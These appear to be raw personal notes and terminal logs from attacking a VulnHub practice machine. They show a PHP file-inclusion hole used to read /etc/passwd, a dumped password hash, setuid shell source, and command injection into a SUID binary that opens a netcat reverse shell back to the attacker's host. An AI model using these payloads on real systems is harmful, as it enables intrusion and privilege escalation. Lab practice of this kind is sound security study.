2 rows in set (0.00 sec)

MariaDB [(none)]> use secretsdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [secretsdb]> show tables;
+---------------------+
| Tables_in_secretsdb |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

MariaDB [secretsdb]> select * from users;
+------+----------+----------------------------------+
| id   | username | password                         |
+------+----------+----------------------------------+
|    1 | pinky    | e09d0a6ab74963a7ad389a8ae5a79aaa |
+------+----------+----------------------------------+
1 row in set (0.00 sec)

MariaDB [secretsdb]> \q
Bye
stefano@Pinkys-Palace:/tmp$ 

stefano@Pinkys-Palace:/tmp$ cat /var/www/html/nginx/pinkydb/html/pageegap.php 
<?php
	include($_GET['1337']);
?>
stefano@Pinkys-Palace:/tmp$ 

Handy !! --

root@7242-alpha-reticuli:~# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
root@7242-alpha-reticuli:~# 


/var/www/html/nginx/pinkydb/html/credentialsdir1425364865:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Mar 17 03:56 .
drwxr-xr-x 3 www-data www-data 4.0K Mar 17 03:56 ..
-r--r--r-- 1 root     root     1.8K Mar 14 17:25 id_rsa
-rw-r--r-- 1 root     root       81 Mar 16 03:54 notes.txt


Priv Escilation with qsub SUID binary --
Become pinky.


stefano@Pinkys-Palace:~/tools$ ls -l
total 20
-rw-r--r-- 1 stefano stefano     65 Mar 16 04:28 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16 04:40 qsub
stefano@Pinkys-Palace:~/tools$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
stefano@Pinkys-Palace:~/tools$ cd /tmp/
stefano@Pinkys-Palace:/tmp$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
stefano@Pinkys-Palace:/tmp$ vim setuid.c 
stefano@Pinkys-Palace:/tmp$ cat /etc/passwd | grep pinky
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
stefano@Pinkys-Palace:/tmp$ cat setuid.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void){
	setuid(1000);
	setgid(1000);
	system("/bin/bash");
}
stefano@Pinkys-Palace:/tmp$ gcc setuid.c -o setuid
setuid.c: In function ‘main’:
setuid.c:8:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  system("/bin/bash");
  ^~~~~~
stefano@Pinkys-Palace:/tmp$ chmod 755 setuid
stefano@Pinkys-Palace:/tmp$ ls -l
total 5372
-rwxr-xr-x 1 stefano stefano 5037384 Jun  6 19:18 kernelpop
-rw-r--r-- 1 stefano stefano  283423 Jun 10 10:35 le.txt
-rw-r--r-- 1 stefano stefano   43488 Jun 10 10:24 LinEnum.sh
-rw-r--r-- 1 stefano stefano   25304 Jun 10 09:41 linuxprivchecker.py
-rw-r--r-- 1 stefano stefano   71075 Jun 10 09:53 lpc.txt
-rwxr-xr-x 1 stefano stefano    8744 Jun 10 12:02 setuid
-rw-r--r-- 1 stefano stefano     133 Jun 10 12:01 setuid.c
drwx------ 3 root    root       4096 Jun  9 12:19 systemd-private-20fb21b35cad4169a0f3c375de80dd1f-apache2.service-EiovSc
drwx------ 3 root    root       4096 Jun 10 10:24 systemd-private-20fb21b35cad4169a0f3c375de80dd1f-systemd-resolved.service-038g9q
drwx------ 3 root    root       4096 Jun  9 12:19 systemd-private-20fb21b35cad4169a0f3c375de80dd1f-systemd-timesyncd.service-7b49km
stefano@Pinkys-Palace:/tmp$ chmod 4755 setuid
stefano@Pinkys-Palace:/tmp$ ls -l setuid
-rwsr-xr-x 1 stefano stefano 8744 Jun 10 12:02 setuid
stefano@Pinkys-Palace:/tmp$ mv setuid qsub
stefano@Pinkys-Palace:/tmp$ ls -l qsub 
-rwsr-xr-x 1 stefano stefano 8744 Jun 10 12:02 qsub
stefano@Pinkys-Palace:/tmp$ 

Alter PATH for Exec --

!! FUCK IT !! --
Getting file this way --

23:11:21-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ wget http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub -O qsub
--2018-06-10 23:11:23--  http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub
Resolving pinkydb (pinkydb)... 192.168.1.119
Connecting to pinkydb (pinkydb)|192.168.1.119|:7654... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘qsub’

qsub                                                [ <=>                                                                                                   ]  13.07K  --.-KB/s    in 0s      

2018-06-10 23:11:23 (196 MB/s) - ‘qsub’ saved [13384]

23:11:23-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ ls -l qsub 
-rw-r--r-- 1 cdowns cdowns 13384 Jun 10 23:11 qsub
23:11:29-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ chmod 755 qsub 
23:11:36-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ strings qsub 
/lib64/ld-linux-x86-64.so.2
libc.so.6
exit
__isoc99_scanf
puts
strlen
send
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__cxa_finalize
strcmp
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.7
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
%s <Message>
TERM
[+] Input Password: 
Bad hacker! Go away!
[+] Welcome to Question Submit!
[!] Incorrect Password!
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
qsub.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
getenv@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
setresuid@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
setresgid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
getegid@@GLIBC_2.2.5
__bss_start
asprintf@@GLIBC_2.2.5
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
send
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
23:11:41-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ 

Inject code into "/bin/echo %s >> /home/pinky/messages/stefano_msg.txt" --
--> xterm-256color <enter>

Inject Code --
Trying Reverse nc shell --

[+] Welcome to Question Submit!stefano@Pinkys-Palace:~/tools$ echo $TERM
xterm-256color
stefano@Pinkys-Palace:~/tools$ ./qsub '`nc -nv 192.168.1.116 1339 -e /bin/bash`'
[+] Input Password: xterm-256color
(UNKNOWN) [192.168.1.116] 1339 (?) open


Catch Shell --
Upgrade my shell to TTY --

3:34:07-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ sudo nc -lvp 1339
listening on [any] 1339 ...
connect to [192.168.1.116] from pinkydb [192.168.1.119] 37978
 	python -c 'import pty;pty.spawn("/bin/bash")'
pinky@Pinkys-Palace:~/tools$ id
id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~/tools$ 

Upgrade my group --

pinky@Pinkys-Palace:~/tools$ id
id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~/tools$ ls -l /usr/local/bin/backup.sh
ls -l /usr/local/bin/backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17 21:24 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~/tools$ newgrp
newgrp
pinky@Pinkys-Palace:~/tools$ id
id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)
pinky@Pinkys-Palace:~/tools$ cd ../
pinky@Pinkys-Palace:~$ cat /etc/passwd | grep demon
cat /etc/passwd | grep demon
demon:x:1001:1001::/home/demon:/bin/bash
pinky@Pinkys-Palace:~$ cd /tmp ; echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(1000);\n\tsetgid(1000);\n\tsystem("/bin/bash");\n}' > setuid.c
pinky@Pinkys-Palace:/tmp$ cat setuid.c
cat setuid.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void){
	setuid(1000);
	setgid(1000);
	system("/bin/bash");
}
pinky@Pinkys-Palace:/tmp$ gcc setuid.c -o backup.sh
gcc setuid.c -o baskup.sh
setuid.c: In function ‘main’:
setuid.c:8:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  system("/bin/bash");
  ^~~~~~
pinky@Pinkys-Palace:/tmp$ chmod 4755 backup.sh
chmod 4755 backup.sh
pinky@Pinkys-Palace:/tmp$ ls -l backup.sh
ls -l backup.sh
-rwsr-xr-x 1 pinky pinky 8744 Jun 11 12:00 backup.sh
pinky@Pinkys-Palace:/tmp$ 


Check User Pinky --

pinky@Pinkys-Palace:~/tools$ find / -group pinky 2>/dev/null
find / -group pinky 2>/dev/null
/home/pinky
/home/pinky/.bash_history
/home/pinky/.bashrc
/home/pinky/.profile
/home/pinky/.bash_logout
/home/pinky/messages
/home/pinky/messages/stefano_msg.txt
/usr/local/bin/backup.sh
pinky@Pinkys-Palace:~/tools$ ls -l /usr/local/bin/backup.sh
ls -l /usr/local/bin/backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17 21:24 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~/tools$ 

Oh boy ! Next up we become the User Demon --


Re Run LinEnum -t and linuxprivchecker.py --

    /etc/apache2/sites-available/default-ssl.conf:		#	 Note that no password is obtained from the user. Every entry in the user
    /etc/apache2/sites-available/default-ssl.conf:		#	 file needs this password: `xxj31ZMTZzkVA'.

Lets try the password we found for root / demon --


pinky@Pinkys-Palace:/tmp$ su - demon -s /bin/bash
su - demon -s /bin/bash
Password: xxj31ZMTZzkVA

su: Authentication failure
pinky@Pinkys-Palace:/tmp$ su - root -s /bin/sh
su - root -s /bin/sh
Password: xxj31ZMTZzkVA

su: Authentication failure
pinky@Pinkys-Palace:/tmp$ 

Suck !!!! --





